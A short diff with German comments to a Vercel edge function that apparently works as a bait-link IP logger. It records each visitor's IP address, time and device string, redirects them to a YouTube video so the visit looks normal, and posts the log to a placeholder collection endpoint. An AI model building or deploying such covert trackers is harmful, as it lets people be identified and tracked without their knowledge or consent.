@@ -11,11 +11,9 @@ export default async function handler(request) {
   const timestamp = new Date().toISOString();
 
   // Erstelle den Log-Eintrag
-  const logEntry = `IP: ${ip} | Zeit: ${timestamp} | Gerät: ${userAgent}\n`;
+  const logEntry = `IP: ${ip} | Zeit: ${timestamp} | Gerät: ${userAgent}`;
 
   // Leite den Nutzer auf die Köder-Seite weiter.
-  // Wir erstellen eine einfache HTML-Seite als Antwort, die den Nutzer weiterleitet.
-  // So sieht es für ihn aus, als hätte er eine normale Seite aufgerufen.
   const redirectUrl = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
 
   const htmlResponse = `
@@ -31,8 +29,8 @@ export default async function handler(request) {
     </html>
   `;
 
-  // Sende den Log-Eintrag an die view-logs Funktion, um ihn zu speichern.
-  // Dies ist ein Trick, um Zustand (die Log-Datei) in Edge Functions zu speichern.
+  // Sende den Log-Eintrag als POST-Request an die view-logs Funktion.
+  // Das ist der zuverlässige Weg, um Zustand zwischen Aufrufen zu speichern.
   try {
     await fetch('https://deine-url.vercel.app/api/view-logs', {
       method: 'POST',
@@ -40,7 +38,6 @@ export default async function handler(request) {
       body: logEntry,
     });
   } catch (error) {
-    // Falls das Speichern fehlschlägt, machen wir trotzdem weiter.
     console.error("Failed to log IP:", error);
   }
 
